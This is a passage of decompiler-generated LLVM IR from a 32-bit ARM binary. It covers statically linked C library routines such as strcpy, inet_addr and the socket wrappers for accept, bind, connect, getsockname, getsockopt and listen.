  store i32 %v5_12b00, i32* %v4_12b00, align 4
  %v6_12b00 = add i32 %v0_12ae054, 24
  store i32 %v6_12b00, i32* @r3, align 4
  %v0_12b04 = load i32, i32* %r2.global-to-local, align 4
  %v1_12b04 = add i32 %v0_12b04, -8
  store i32 %v1_12b04, i32* %r2.global-to-local, align 4
  %v5_12b0c = icmp slt i32 %v1_12b04, 8
  br i1 %v5_12b0c, label %dec_label_pc_12b00.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %dec_label_pc_12b00
  %v7_12b0c = inttoptr i32 %v6_12b00 to i32*
  %v8_12b0c = load i32, i32* @r1, align 4
  store i32 %v8_12b0c, i32* %v7_12b0c, align 4
  %v9_12b0c = add i32 %v0_12ae054, 28
  %v10_12b0c = inttoptr i32 %v9_12b0c to i32*
  %v11_12b0c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_12b0c, i32* %v10_12b0c, align 4
  %v12_12b0c = add i32 %v0_12ae054, 32
  store i32 %v12_12b0c, i32* @r3, align 4
  %v6_12b10 = load i32, i32* %r2.global-to-local, align 4
  %v7_12b10 = add i32 %v6_12b10, -8
  store i32 %v7_12b10, i32* %r2.global-to-local, align 4
  %v5_12adc = icmp slt i32 %v7_12b10, 8
  br i1 %v5_12adc, label %dec_label_pc_12ad8.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge

dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge:  ; preds = %dec_label_pc_12ad8
  %v2_12ae0.pre = load i32, i32* @r1, align 4
  %v1_12ae0 = inttoptr i32 %v12_12b0c to i32*
  store i32 %v2_12ae0.pre, i32* %v1_12ae0, align 4
  %v3_12ae0 = add i32 %v0_12ae054, 36
  %v4_12ae0 = inttoptr i32 %v3_12ae0 to i32*
  %v5_12ae0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12ae0, i32* %v4_12ae0, align 4
  %v6_12ae0 = add i32 %v0_12ae054, 40
  store i32 %v6_12ae0, i32* @r3, align 4
  %v0_12ae4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ae4 = add i32 %v0_12ae4, -8
  store i32 %v1_12ae4, i32* %r2.global-to-local, align 4
  %v5_12aec = icmp slt i32 %v1_12ae4, 8
  br i1 %v5_12aec, label %dec_label_pc_12ae0.dec_label_pc_12b18.loopexit_crit_edge, label %dec_label_pc_12af0

dec_label_pc_12ad8.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12ad8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b18

dec_label_pc_12ae0.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge, %dec_label_pc_12ae0.preheader
  %v1_12ae4.lcssa = phi i32 [ %v1_12ae452, %dec_label_pc_12ae0.preheader ], [ %v1_12ae4, %dec_label_pc_12ad8.dec_label_pc_12ae0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b18

dec_label_pc_12af0.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12af0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b18

dec_label_pc_12b00.dec_label_pc_12b18.loopexit_crit_edge: ; preds = %dec_label_pc_12b00
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %dec_label_pc_12ad4, %dec_label_pc_12ad8.dec_label_pc_12b18.loopexit_crit_edge, %dec_label_pc_12ae0.dec_label_pc_12b18.loopexit_crit_edge, %dec_label_pc_12af0.dec_label_pc_12b18.loopexit_crit_edge, %dec_label_pc_12b00.dec_label_pc_12b18.loopexit_crit_edge, %entry
  %v0_12b20 = phi i32 [ %arg3, %entry ], [ %v1_12b04, %dec_label_pc_12b00.dec_label_pc_12b18.loopexit_crit_edge ], [ %v1_12af4, %dec_label_pc_12af0.dec_label_pc_12b18.loopexit_crit_edge ], [ %v1_12ae4.lcssa, %dec_label_pc_12ae0.dec_label_pc_12b18.loopexit_crit_edge ], [ %v7_12b10, %dec_label_pc_12ad8.dec_label_pc_12b18.loopexit_crit_edge ], [ %v0_12ad8.pr, %dec_label_pc_12ad4 ]
  %v2_12b18 = icmp eq i32 %v0_12b20, 0
  store i1 %v2_12b18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b18, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12b18
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_12b18
  %v1_12b20 = sub i32 7, %v0_12b20
  store i32 %v1_12b20, i32* %r2.global-to-local, align 4
  %v3_12b24 = mul i32 %v1_12b20, 4
  %v4_12b24 = add i32 %v3_12b24, ptrtoint (i32* @global_var_12b2c.527 to i32)
  call void @__pseudo_branch(i32 %v4_12b24)
  %v0_12b2c = load i32, i32* @r1, align 4
  %v1_12b2c = trunc i32 %v0_12b2c to i8
  %v2_12b2c = load i32, i32* @r3, align 4
  %v3_12b2c = inttoptr i32 %v2_12b2c to i8*
  store i8 %v1_12b2c, i8* %v3_12b2c, align 1
  %v4_12b2c = load i32, i32* @r3, align 4
  %v5_12b2c = add i32 %v4_12b2c, 1
  store i32 %v5_12b2c, i32* %r3.global-to-local, align 4
  %v0_12b30 = load i32, i32* @r1, align 4
  %v1_12b30 = trunc i32 %v0_12b30 to i8
  %v3_12b30 = inttoptr i32 %v5_12b2c to i8*
  store i8 %v1_12b30, i8* %v3_12b30, align 1
  %v4_12b30 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b30 = add i32 %v4_12b30, 1
  store i32 %v5_12b30, i32* %r3.global-to-local, align 4
  %v0_12b34 = load i32, i32* @r1, align 4
  %v1_12b34 = trunc i32 %v0_12b34 to i8
  %v3_12b34 = inttoptr i32 %v5_12b30 to i8*
  store i8 %v1_12b34, i8* %v3_12b34, align 1
  %v4_12b34 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b34 = add i32 %v4_12b34, 1
  store i32 %v5_12b34, i32* %r3.global-to-local, align 4
  %v0_12b38 = load i32, i32* @r1, align 4
  %v1_12b38 = trunc i32 %v0_12b38 to i8
  %v3_12b38 = inttoptr i32 %v5_12b34 to i8*
  store i8 %v1_12b38, i8* %v3_12b38, align 1
  %v4_12b38 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b38 = add i32 %v4_12b38, 1
  store i32 %v5_12b38, i32* %r3.global-to-local, align 4
  %v0_12b3c = load i32, i32* @r1, align 4
  %v1_12b3c = trunc i32 %v0_12b3c to i8
  %v3_12b3c = inttoptr i32 %v5_12b38 to i8*
  store i8 %v1_12b3c, i8* %v3_12b3c, align 1
  %v4_12b3c = load i32, i32* %r3.global-to-local, align 4
  %v5_12b3c = add i32 %v4_12b3c, 1
  store i32 %v5_12b3c, i32* %r3.global-to-local, align 4
  %v0_12b40 = load i32, i32* @r1, align 4
  %v1_12b40 = trunc i32 %v0_12b40 to i8
  %v3_12b40 = inttoptr i32 %v5_12b3c to i8*
  store i8 %v1_12b40, i8* %v3_12b40, align 1
  %v4_12b40 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b40 = add i32 %v4_12b40, 1
  store i32 %v5_12b40, i32* %r3.global-to-local, align 4
  %v0_12b44 = load i32, i32* @r1, align 4
  %v1_12b44 = trunc i32 %v0_12b44 to i8
  %v3_12b44 = inttoptr i32 %v5_12b40 to i8*
  store i8 %v1_12b44, i8* %v3_12b44, align 1
  %v4_12b44 = load i32, i32* %r3.global-to-local, align 4
  %v5_12b44 = add i32 %v4_12b44, 1
  store i32 %v5_12b44, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_12ae0, { 1, 0 }
  uselistorder i32 %v12_12b0c, { 1, 2, 0 }
  uselistorder i32 %v0_12ae054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12ad8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12ac8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_12abc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_12b18, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12af0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_12b601 = load i32, i32* @r1, align 4
  %v1_12b602 = inttoptr i32 %v0_12b601 to i8*
  %v2_12b603 = load i8, i8* %v1_12b602, align 1
  %v2_12b645 = icmp eq i8 %v2_12b603, 0
  store i1 %v2_12b645, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_12b603, i8* %arg1, align 1
  br i1 %v2_12b645, label %dec_label_pc_12b70, label %dec_label_pc_12b58

dec_label_pc_12b58:                               ; preds = %entry, %dec_label_pc_12b58
  %v0_12b58 = load i32, i32* @r1, align 4
  %v1_12b58 = add i32 %v0_12b58, 1
  store i32 %v1_12b58, i32* @r1, align 4
  %v0_12b5c = load i32, i32* %r2.global-to-local, align 4
  %v1_12b5c = add i32 %v0_12b5c, 1
  store i32 %v1_12b5c, i32* %r2.global-to-local, align 4
  %v1_12b60 = inttoptr i32 %v1_12b58 to i8*
  %v2_12b60 = load i8, i8* %v1_12b60, align 1
  %v2_12b64 = icmp eq i8 %v2_12b60, 0
  store i1 %v2_12b64, i1* %cpsr_z.global-to-local, align 1
  %v3_12b68 = inttoptr i32 %v1_12b5c to i8*
  store i8 %v2_12b60, i8* %v3_12b68, align 1
  %v0_12b6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12b6c, label %dec_label_pc_12b70, label %dec_label_pc_12b58

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b58, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b58, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12b7c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_12b7c, i32* @r1, align 4
  %v0_12b80 = call i32 @inet_aton()
  %v2_12b84 = icmp eq i32 %v0_12b80, 0
  %v4_12b88 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12b84, i32 -1, i32 %v4_12b88
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12b9c = load i32, i32* @r7, align 4
  store i32 %v3_12b9c, i32* %stack_var_-8, align 4
  %v0_12ba8 = load i32, i32* @r0, align 4
  store i32 %v0_12ba8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ba8, -4095
  br i1 %tmp, label %dec_label_pc_12bd0, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %entry
  %v0_12bbc = call i32 @__aeabi_read_tp()
  %v3_12bc0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12bc0 = sext i16 %v3_12bc0 to i32
  %v0_12bc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bc4 = sub i32 0, %v0_12bc4
  store i32 %v1_12bc4, i32* %r2.global-to-local, align 4
  %v3_12bc8 = add i32 %v4_12bc0, %v0_12bbc
  %v4_12bc8 = inttoptr i32 %v3_12bc8 to i32*
  store i32 %v1_12bc4, i32* %v4_12bc8, align 4
  %v2_12bd0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12bd0

dec_label_pc_12bd0:                               ; preds = %entry, %dec_label_pc_12bb8
  %v1_12bd4 = phi i32 [ %v0_12ba8, %entry ], [ -1, %dec_label_pc_12bb8 ]
  %v2_12bd0 = phi i32 [ %v3_12b9c, %entry ], [ %v2_12bd0.pre, %dec_label_pc_12bb8 ]
  store i32 %v2_12bd0, i32* @r7, align 4
  ret i32 %v1_12bd4

; uselistorder directives
  uselistorder i32 %v0_12ba8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12bd0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bd8:
  %v0_12bd8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12bd8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12bd8
  %v2_12bdc = load i32, i32* @r8, align 4
  %v5_12bdc = mul i32 %v2_12bdc, 65536
  %v6_12bdc = and i32 %v5_12bdc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12bd8, %bb
  %v7_12bdc = phi i32 [ %arg1, %dec_label_pc_12bd8 ], [ %v6_12bdc, %bb ]
  ret i32 %v7_12bdc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12be4 = load i32, i32* @r4, align 4
  store i32 %v3_12be4, i32* %stack_var_-20, align 4
  %v6_12be4 = load i32, i32* @r5, align 4
  %v9_12be4 = load i32, i32* @r6, align 4
  %v12_12be4 = load i32, i32* @r7, align 4
  %v4_12bf0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_12bf4 = icmp eq i32 %v4_12bf0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12bf4, label %dec_label_pc_12c0c, label %entry.dec_label_pc_12c18_crit_edge

entry.dec_label_pc_12c18_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12c18

dec_label_pc_12c0c:                               ; preds = %entry
  store i32 %v3_12be4, i32* @r4, align 4
  store i32 %v9_12be4, i32* @r6, align 4
  store i32 %v12_12be4, i32* @r7, align 4
  %v0_12c14 = call i32 @__sys_accept()
  br label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %entry.dec_label_pc_12c18_crit_edge, %dec_label_pc_12c0c
  %v0_12c18 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12c18, i32* @r5, align 4
  %v0_12c28 = load i32, i32* @r4, align 4
  store i32 %v0_12c28, i32* @r0, align 4
  %v0_12c2c = call i32 @__sys_accept()
  store i32 %v0_12c2c, i32* @r4, align 4
  %v0_12c34 = load i32, i32* @r5, align 4
  %v1_12c38 = call i32 @__libc_disable_asynccancel(i32 %v0_12c34)
  %v0_12c3c = load i32, i32* @r4, align 4
  %v2_12c44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12c44, i32* @r4, align 4
  store i32 %v6_12be4, i32* @r5, align 4
  store i32 %v9_12be4, i32* @r6, align 4
  store i32 %v12_12be4, i32* @r7, align 4
  ret i32 %v0_12c3c

; uselistorder directives
  uselistorder label %dec_label_pc_12c18, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c54 = load i32, i32* @r7, align 4
  store i32 %v3_12c54, i32* %stack_var_-8, align 4
  %v0_12c60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12c60, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12c60, -4095
  br i1 %tmp, label %dec_label_pc_12c88, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %entry
  %v0_12c74 = call i32 @__aeabi_read_tp()
  %v3_12c78 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12c78 = sext i16 %v3_12c78 to i32
  %v0_12c7c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c7c = sub i32 0, %v0_12c7c
  store i32 %v1_12c7c, i32* %r2.global-to-local, align 4
  %v3_12c80 = add i32 %v4_12c78, %v0_12c74
  %v4_12c80 = inttoptr i32 %v3_12c80 to i32*
  store i32 %v1_12c7c, i32* %v4_12c80, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12c88.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %entry, %dec_label_pc_12c70
  %v1_12c8c = phi i32 [ %v0_12c60, %entry ], [ -1, %dec_label_pc_12c70 ]
  %v2_12c88 = phi i32 [ %v3_12c54, %entry ], [ %v2_12c88.pre, %dec_label_pc_12c70 ]
  store i32 %v2_12c88, i32* @r7, align 4
  ret i32 %v1_12c8c

; uselistorder directives
  uselistorder i32 %v0_12c60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c88, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12c90:
  %v0_12c90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12c90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12c90
  %v2_12c90 = load i32, i32* @sl, align 4
  %v8_12c90 = shl i32 %v2_12c90, %arg2
  %v9_12c90 = and i32 %v8_12c90, %arg1
  %v3_12c94 = load i32, i32* @r7, align 4
  %v8_12c94 = ashr i32 %v9_12c90, %v3_12c94
  %v9_12c94 = and i32 %v8_12c94, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c90, %bb
  %v10_12c94 = phi i32 [ %arg1, %dec_label_pc_12c90 ], [ %v9_12c94, %bb ]
  ret i32 %v10_12c94

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c98 = load i32, i32* @r7, align 4
  store i32 %v3_12c98, i32* %stack_var_-8, align 4
  %v0_12ca4 = load i32, i32* @r0, align 4
  store i32 %v0_12ca4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12ca4, -4095
  br i1 %tmp, label %dec_label_pc_12ccc, label %dec_label_pc_12cb4

dec_label_pc_12cb4:                               ; preds = %entry
  %v0_12cb8 = call i32 @__aeabi_read_tp()
  %v3_12cbc = load i16, i16* @global_var_233d0.483, align 2
  %v4_12cbc = sext i16 %v3_12cbc to i32
  store i32 %v4_12cbc, i32* @r3, align 4
  %v0_12cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cc0 = sub i32 0, %v0_12cc0
  store i32 %v1_12cc0, i32* %r2.global-to-local, align 4
  %v3_12cc4 = add i32 %v4_12cbc, %v0_12cb8
  %v4_12cc4 = inttoptr i32 %v3_12cc4 to i32*
  store i32 %v1_12cc0, i32* %v4_12cc4, align 4
  %v2_12ccc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %entry, %dec_label_pc_12cb4
  %v1_12cd0 = phi i32 [ %v0_12ca4, %entry ], [ -1, %dec_label_pc_12cb4 ]
  %v2_12ccc = phi i32 [ %v3_12c98, %entry ], [ %v2_12ccc.pre, %dec_label_pc_12cb4 ]
  store i32 %v2_12ccc, i32* @r7, align 4
  ret i32 %v1_12cd0

; uselistorder directives
  uselistorder i32 %v0_12ca4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ccc, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12cd4:
  %v0_12cd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12cd4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12cd4
  %v2_12cd8 = load i32, i32* @ip, align 4
  %v5_12cd8 = mul i32 %v2_12cd8, 16384
  %v6_12cd8 = and i32 %v5_12cd8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12cd4, %bb
  %v7_12cd8 = phi i32 [ %arg1, %dec_label_pc_12cd4 ], [ %v6_12cd8, %bb ]
  ret i32 %v7_12cd8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12ce0 = load i32, i32* @r4, align 4
  store i32 %v3_12ce0, i32* %stack_var_-20, align 4
  %v6_12ce0 = load i32, i32* @r5, align 4
  %v9_12ce0 = load i32, i32* @r6, align 4
  %v12_12ce0 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r3, align 4
  %v4_12cec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  store i32 %v4_12cec, i32* @ip, align 4
  %v2_12cf0 = icmp eq i32 %v4_12cec, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_12cf0, label %dec_label_pc_12d08, label %entry.dec_label_pc_12d14_crit_edge

entry.dec_label_pc_12d14_crit_edge:               ; preds = %entry
  br label %dec_label_pc_12d14

dec_label_pc_12d08:                               ; preds = %entry
  store i32 %v3_12ce0, i32* @r4, align 4
  store i32 %v9_12ce0, i32* @r6, align 4
  store i32 %v12_12ce0, i32* @r7, align 4
  %v0_12d10 = call i32 @__sys_connect()
  br label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %entry.dec_label_pc_12d14_crit_edge, %dec_label_pc_12d08
  %v0_12d14 = call i32 @__libc_enable_asynccancel()
  %v0_12d18 = load i32, i32* @r6, align 4
  store i32 %v0_12d18, i32* @r1, align 4
  store i32 %v0_12d14, i32* @r5, align 4
  %v0_12d24 = load i32, i32* @r4, align 4
  store i32 %v0_12d24, i32* @r0, align 4
  %v0_12d28 = call i32 @__sys_connect()
  store i32 %v0_12d28, i32* @r4, align 4
  %v0_12d30 = load i32, i32* @r5, align 4
  %v1_12d34 = call i32 @__libc_disable_asynccancel(i32 %v0_12d30)
  %v0_12d38 = load i32, i32* @r4, align 4
  %v2_12d40 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12d40, i32* @r4, align 4
  store i32 %v6_12ce0, i32* @r5, align 4
  store i32 %v9_12ce0, i32* @r6, align 4
  store i32 %v12_12ce0, i32* @r7, align 4
  ret i32 %v0_12d38

; uselistorder directives
  uselistorder label %dec_label_pc_12d14, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d50 = load i32, i32* @r7, align 4
  store i32 %v3_12d50, i32* %stack_var_-8, align 4
  %v0_12d5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12d5c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12d5c, -4095
  br i1 %tmp, label %dec_label_pc_12d84, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %entry
  %v0_12d70 = call i32 @__aeabi_read_tp()
  %v3_12d74 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12d74 = sext i16 %v3_12d74 to i32
  %v0_12d78 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d78 = sub i32 0, %v0_12d78
  store i32 %v1_12d78, i32* %r2.global-to-local, align 4
  %v3_12d7c = add i32 %v4_12d74, %v0_12d70
  %v4_12d7c = inttoptr i32 %v3_12d7c to i32*
  store i32 %v1_12d78, i32* %v4_12d7c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12d84.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %entry, %dec_label_pc_12d6c
  %v1_12d88 = phi i32 [ %v0_12d5c, %entry ], [ -1, %dec_label_pc_12d6c ]
  %v2_12d84 = phi i32 [ %v3_12d50, %entry ], [ %v2_12d84.pre, %dec_label_pc_12d6c ]
  store i32 %v2_12d84, i32* @r7, align 4
  ret i32 %v1_12d88

; uselistorder directives
  uselistorder i32 %v0_12d5c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d84, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d8c:
  %v0_12d8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d8c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12d8c
  %v2_12d90 = load i32, i32* @r4, align 4
  %v3_12d90 = load i32, i32* @r6, align 4
  %v8_12d90 = ashr i32 %v2_12d90, %v3_12d90
  %v9_12d90 = and i32 %v8_12d90, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d8c, %bb
  %v10_12d90 = phi i32 [ %arg1, %dec_label_pc_12d8c ], [ %v9_12d90, %bb ]
  ret i32 %v10_12d90

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12d94 = load i32, i32* @r4, align 4
  store i32 %v3_12d94, i32* %stack_var_-12, align 4
  %v0_12da4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12da4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12da4, -4095
  br i1 %tmp, label %dec_label_pc_12dcc, label %dec_label_pc_12db4

dec_label_pc_12db4:                               ; preds = %entry
  %v0_12db8 = call i32 @__aeabi_read_tp()
  %v3_12dbc = load i16, i16* @global_var_233d0.483, align 2
  %v4_12dbc = sext i16 %v3_12dbc to i32
  %v0_12dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12dc0 = sub i32 0, %v0_12dc0
  store i32 %v1_12dc0, i32* %r2.global-to-local, align 4
  %v3_12dc4 = add i32 %v4_12dbc, %v0_12db8
  %v4_12dc4 = inttoptr i32 %v3_12dc4 to i32*
  store i32 %v1_12dc0, i32* %v4_12dc4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12dcc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %entry, %dec_label_pc_12db4
  %v1_12dd0 = phi i32 [ %v0_12da4, %entry ], [ -1, %dec_label_pc_12db4 ]
  %v2_12dcc = phi i32 [ %v3_12d94, %entry ], [ %v2_12dcc.pre, %dec_label_pc_12db4 ]
  store i32 %v2_12dcc, i32* @r4, align 4
  ret i32 %v1_12dd0

; uselistorder directives
  uselistorder i32 %v0_12da4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12dcc, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12dd4:
  %v0_12dd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12dd4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12dd4
  %v2_12dd8 = load i32, i32* @ip, align 4
  %v5_12dd8 = mul i32 %v2_12dd8, 4096
  %v6_12dd8 = and i32 %v5_12dd8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12dd4, %bb
  %v7_12dd8 = phi i32 [ %arg1, %dec_label_pc_12dd4 ], [ %v6_12dd8, %bb ]
  ret i32 %v7_12dd8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ddc = load i32, i32* @r7, align 4
  store i32 %v3_12ddc, i32* %stack_var_-8, align 4
  %v0_12de8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12de8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12de8, -4095
  br i1 %tmp, label %dec_label_pc_12e10, label %dec_label_pc_12df8

dec_label_pc_12df8:                               ; preds = %entry
  %v0_12dfc = call i32 @__aeabi_read_tp()
  %v3_12e00 = load i16, i16* @global_var_233d0.483, align 2
